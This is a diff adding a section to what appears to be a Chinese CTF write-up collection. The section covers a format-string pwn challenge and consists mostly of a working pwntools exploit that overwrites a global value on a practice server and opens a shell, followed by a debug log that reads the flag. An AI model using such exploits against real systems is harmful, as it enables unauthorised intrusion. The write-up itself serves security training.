@@ -488,3 +488,42 @@ sh.sendlineafter('Correct\n',payload)
 sh.interactive()
 ```
 
+## 0x9.[第五空间2019 决赛]PWN5
+
+格式化字符串漏洞
+
+```python 
+from pwn import *
+context(log_level='debug')
+#io = process("./pwn")
+io = remote('node3.buuoj.cn',25276)
+dword_804C044 = 0x804C044
+
+io.recvuntil("name:")
+
+payload = fmtstr_payload(10,{dword_804C044:0x1111})
+io.sendline(payload)
+
+io.recvuntil(":")
+
+io.sendline(str(0x1111))
+
+io.interactive()
+```
+
+
+
+```
+$ cat flag
+[DEBUG] Sent 0x9 bytes:
+    'cat flag\n'
+[DEBUG] Received 0x2b bytes:
+    'flag{18b6ca26-1d7d-407b-8b08-63dd66d4e775}\n'
+flag{18b6ca26-1d7d-407b-8b08-63dd66d4e775}
+```
+
+
+
+
+
+
